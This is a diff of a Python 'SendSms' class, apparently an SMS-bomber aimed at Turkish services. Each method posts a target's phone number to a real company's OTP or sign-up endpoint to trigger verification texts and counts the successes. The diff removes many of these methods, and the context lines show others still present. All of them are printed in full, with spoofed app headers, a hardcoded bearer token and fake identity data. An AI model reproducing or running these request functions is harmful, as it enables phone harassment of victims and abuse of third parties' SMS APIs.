@@ -253,53 +253,7 @@ class SendSms():
             else:
                 raise
         except:
-            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> rentiva.com")
-            
-    
-    #bineq.tech
-    def Bineq(self):
-        try:
-            url = f"https://bineqapi.heymobility.tech:443/V2//api/User/ActivationCodeRequest?organizationId=9DCA312E-18C8-4DAE-AE65-01FEAD558739&phonenumber={self.phone}"
-            headers = {"Accept": "application/json, text/plain, */*", "Content-Type": "application/json", "Accept-Encoding": "gzip, deflate", "User-Agent": "HEY!%20Scooter/116 CFNetwork/1335.0.3 Darwin/21.6.0", "Accept-Language": "tr"}
-            bineq = requests.post(url, headers=headers)
-            if bineq.json()["IsSuccess"] == True:
-                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> bineqapi.heymobility.tech")
-                self.adet += 1
-            else:
-                raise
-        except:
-            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> bineqapi.heymobility.tech")
-            
-            
-    #superpedestrian.com
-    def Link(self):
-        try:
-            url = "https://consumer-auth.linkfleet.de:443/consumer_auth/register"
-            json={"phone_number": f"+90{self.phone}"}
-            link = requests.post(url, json=json)
-            if link.json()["detail"] == "Ok":
-                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> consumer-auth.linkfleet.de")
-                self.adet += 1
-            else:
-                raise
-        except:
-            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> consumer-auth.linkfleet.de")
-
-            
-    #loncamarket.com
-    def Lonca(self):
-        try:
-            headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:106.0) Gecko/20100101 Firefox/106.0", "Accept": "application/json, text/javascript, */*; q=0.01", "Accept-Language": "tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3", "Accept-Encoding": "gzip, deflate", "Content-Type": "application/json; charset=utf-8", "X-Requested-With": "XMLHttpRequest", "Origin": "https://www.loncamarket.com", "Dnt": "1", "Referer": "https://www.loncamarket.com/bayi/basvuru/sozlesme", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-origin", "Te": "trailers", "Connection": "close"}
-            json={"Address": self.phone, "ConfirmationType": 0}
-            lonca = requests.post("https://www.loncamarket.com/lid/identity/sendconfirmationcode", headers=headers, json=json, verify=False, timeout=3)
-            if lonca.status_code == 200:
-                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> loncamarket.com")
-                self.adet += 1
-            else:
-                raise
-        except:
-            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> loncamarket.com")   
-            
+            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> rentiva.com")       
     
     #dgnonline.com
     def Dgn(self):
@@ -424,68 +378,7 @@ class SendSms():
                 raise
         except:
             print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> app.buyursungelsin.com")
-            
-    
-    #idealdata.com.tr
-    def Osmanlideal(self):
-        try:
-            r = requests.get(f"https://osmgck.idealdata.com.tr:7850/X%02REQ_SMSDEMO%02{self.mail}%020{self.phone}")
-            if r.status_code == 200:
-                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> osmgck.idealdata.com.tr")
-                self.adet += 1
-            else:
-                raise
-        except:
-            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> osmgck.idealdata.com.tr")
-            
-    
-    #pinarsu.com.tr
-    def Pinar(self):
-        try:
-            url = "https://pinarsumobileservice.yasar.com.tr:443/pinarsu-mobil/api/Customer/SendOtp"
-            headers = {"Content-Type": "application/json", "Devicetype": "ios", "Accept": "*/*", "Authorization": "bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJJZCI6ImMyZGFiNzVmLTUxNTUtNGQ4NS1iZjkxLWNkYjQxOTkwMTRiZCIsImlzcyI6Imh0dHA6Ly9sb2NhbGhvc3QvIiwiYXVkIjoiaHR0cDovL2xvY2FsaG9zdC8iLCJpYXQiOjE2NzEyODI2NDcsImV4cCI6MTY4MTY1MDY0N30.WkjMSCamAiYXbanSHYE6LxzII-BjZRtjdyYKMcToWHg", "Accept-Language": "tr-TR;q=1.0, en-TR;q=0.9", "Level": "40202", "Accountid": "062511D3-BF52-4441-A29B-8250E3900931", "Accept-Encoding": "gzip, deflate", "User-Agent": "Yasam Pinarim/4.2.2 (com.pinarsu.PinarSu; build:11; iOS 15.6.1) Alamofire/4.2.2", "Languageid": "D4FF115D-1AB5-4141-8719-A102C3CF9F1E", "Connection": "close"}
-            json={"MobilePhone": self.phone}
-            r = requests.post(url, headers=headers, json=json)
-            if r.text == "true":
-                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> pinarsumobileservice.yasar.com.tr")
-                self.adet += 1
-            else:
-                raise
-        except:
-            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> pinarsumobileservice.yasar.com.tr")
-            
-    
-    #suiste.com
-    def Suiste(self):
-        try:
-            url = "https://suiste.com:443/api/auth/code"
-            headers = {"Accept": "application/json", "Content-Type": "application/x-www-form-urlencoded; charset=utf-8", "User-Agent": "suiste/1.5.10 (com.mobillium.suiste; build:1228; iOS 15.6.1) Alamofire/5.6.2", "Accept-Language": "tr", "Accept-Encoding": "gzip, deflate"}
-            data = {"action": "register", "gsm": self.phone}
-            r = requests.post(url, headers=headers, data=data)
-            if r.json()["code"] == "common.success":
-                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> suiste.com")
-                self.adet += 1
-            else:
-                raise
-        except:
-            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> suiste.com")
-            
-            
-    #hayatsu.com.tr
-    def Hayat(self):
-        try:
-            url = "https://www.hayatsu.com.tr:443/api/signup/otpsend"
-            json={"mobilePhoneNumber": self.phone}
-            r = requests.post(url, json=json)
-            if (r.json()["IsSuccessful"]) == True:
-                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> hayatsu.com.tr")
-                self.adet += 1
-            else:
-                raise
-        except:
-            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> hayatsu.com.tr")
-            
-            
+                        
     #pisir.com
     def Pisir(self):
         try:
@@ -510,53 +403,7 @@ class SendSms():
                 raise
         except:
             print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> 3uptzlakwi.execute-api.eu-west-1.amazonaws.com")
-
-
-    #ikinciyeni.com
-    def IkinciYeni(self):
-        try:
-            url = "https://apigw.ikinciyeni.com:443/RegisterRequest"
-            json={"accounttype": 1, "email": self.mail, "isAddPermission": True, "lastName": "Bas", "name": "Memati", "phone": self.phone}
-            r = requests.post(url, json=json)
-            if (r.json()["isSucceed"]) == True:
-                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> apigw.ikinciyeni.com")
-                self.adet += 1
-            else:
-                raise
-        except:
-            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> apigw.ikinciyeni.com")
-            
-            
-    #terrapizza.com.tr
-    def Terra(self):
-        try:
-            url = "https://api.terrapizza.com.tr:443/api/v1/customers"
-            json={"email": self.mail, "emailPermitted": True, "kvkApproved": True, "name": "Memati", "phone": str(self.phone), "smsPermitted": True, "surname": "Bas", "userAgreementApproved": True}
-            r = requests.post(url,  json=json)
-            if (r.status_code) == 201:
-                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> api.terrapizza.com.tr")
-                self.adet += 1
-            else:
-                raise
-        except:
-            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> api.terrapizza.com.tr")
-            
-            
-    #ipragaz.com.tr
-    def IpraGaz(self):
-        try:
-            url = "https://ipapp.ipragaz.com.tr:443/ipragazmobile/v2/ipragaz-b2c/ipragaz-customer/mobile-register-otp"
-            json={"birthDate": "31/08/1975", "carPlate": "31 ABC 31", "name": "Memati Bas", "otp": "", "phoneNumber": str(self.phone), "playerId": ""}
-            r = requests.post(url, json=json)
-            if (r.json()["phoneNumber"]) == str(self.phone):
-                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> ipapp.ipragaz.com.tr")
-                self.adet += 1
-            else:
-                raise
-        except:
-            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> ipapp.ipragaz.com.tr")
-            
-             
+               
     #mogazmobilapinew.aygaz.com.tr
     def Mogaz(self):
         try:
@@ -571,20 +418,6 @@ class SendSms():
         except:
             print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> mogazmobilapinew.aygaz.com.tr")
             
-            
-    #ipragaz.com.tr
-    def GoMobile(self):
-        try:
-            r = requests.get(f"https://gomobilapp.ipragaz.com.tr:443/api/v1/0/authentication/sms/send?phone={self.phone}&isRegistered=true")
-            if (r.json()["data"]["success"]) == True:
-                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> gomobilapp.ipragaz.com.tr")
-                self.adet += 1
-            else:
-                raise
-        except:
-            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> gomobilapp.ipragaz.com.tr")
-            
-    
     #petrolofisi.com.tr
     def PetrolOfisi(self):
         try:
@@ -627,38 +460,7 @@ class SendSms():
                 raise
         except:
             print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> api.opet.com.tr")
-
-
-    #dolap.com
-    def Dolap(self):
-        try:
-            url = "https://api-gateway.dolap.com:443/member"
-            headers = {"Content-Type": "application/json", "Accept": "*/*", "Appversion": "359", "Accept-Language": "tr-TR,tr;q=0.9", "Accept-Encoding": "gzip, deflate", "Categorygroup": "WOMAN", "Access-Token": "", "User-Agent": "dolap/2 CFNetwork/1335.0.3 Darwin/21.6.0", "Appplatform": "ios"}
-            json={"advertisingId": "", "campaignAgreement": False, "email": self.mail, "memberCookie": "", "membershipAgreement": True, "nickName": "tingirifistik", "password": "31ABC..abc31", "phoneNumber": self.phone}
-            r = requests.put(url, headers=headers, json=json)
-            if r.status_code == 200:
-                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> api-gateway.dolap.com")
-                self.adet += 1
-            else:
-                raise
-        except:
-            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> api-gateway.dolap.com")
-            
-
-    #heymobility.tech
-    def Hey(self):
-        try:
-            headers = {"Accept": "application/json, text/plain, */*", "Content-Type": "application/json", "Accept-Encoding": "gzip, deflate", "User-Agent": "HEY!%20Scooter/116 CFNetwork/1335.0.3 Darwin/21.6.0", "Accept-Language": "tr"}
-            r = requests.post(f"https://heyapi.heymobility.tech:443/V9//api/User/ActivationCodeRequest?organizationId=9DCA312E-18C8-4DAE-AE65-01FEAD558739&phonenumber={self.phone}", headers=headers)
-            if (r.json()["IsSuccess"]) == True:
-                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> heyapi.heymobility.tech")
-                self.adet += 1
-            else:
-                raise
-        except:
-            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> heyapi.heymobility.tech")
-            
-
+           
     #tazi.tech
     def Tazi(self):
         try:
@@ -738,23 +540,7 @@ class SendSms():
             else:
                 raise
         except:
-            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> api2.e-bebek.com")
-
-
-    #sakasu.com.tr
-    def Saka(self):
-        try:
-            url = "https://mobilcrm2.saka.com.tr:443/api/customer/login"
-            json={"gsm": self.phone}
-            r = requests.post(url, json=json)
-            if (r.json()["status"]) == 1 :
-                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> mobilcrm2.saka.com.tr")
-                self.adet += 1
-            else:
-                raise
-        except:
-            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> mobilcrm2.saka.com.tr")
-            
+            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> api2.e-bebek.com")          
     
     #gofody.com
     def Gofody(self):
@@ -860,22 +646,7 @@ class SendSms():
                 raise
         except:
             print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> anadolu.com.tr")
-            
-            
-    #accordors.com
-    def Accordors(self):
-        try:
-            url = "http://aouws.accordors.com:80/api"
-            json={"apiVersion": "0.1.0", "id": "", "method": "members.new", "params": {"email": self.mail, "firstname": "Memati", "gender": "male", "identityno": "00000000001", "lastname": "Bas", "password": "31ABC..abc31", "phone": self.phone}}
-            r = requests.post(url, json=json)
-            if r.json()["data"]:
-                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> aouws.accordors.com")
-                self.adet += 1
-            else:
-                raise
-        except:
-            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> aouws.accordors.com")
-            
+           
         
     #marti.tech
     def Marti(self):
@@ -904,19 +675,4 @@ class SendSms():
             else:
                 raise
         except:
-            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> api.hoplagit.com")
-            
-    
-    #gokarma.app
-    def Karma(self):
-        try:
-            url = "https://api.gokarma.app:443/v1/auth/send-sms"
-            json={"deviceId": "31", "language": "tr-TR", "phoneNumber": f"90{self.phone}", "type": "REGISTER"}
-            r = requests.post(url,  json=json)
-            if r.status_code == 201:
-                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> api.gokarma.app")
-                self.adet += 1
-            else:
-                raise
-        except:
-            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> api.gokarma.app")
+            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> api.hoplagit.com")         
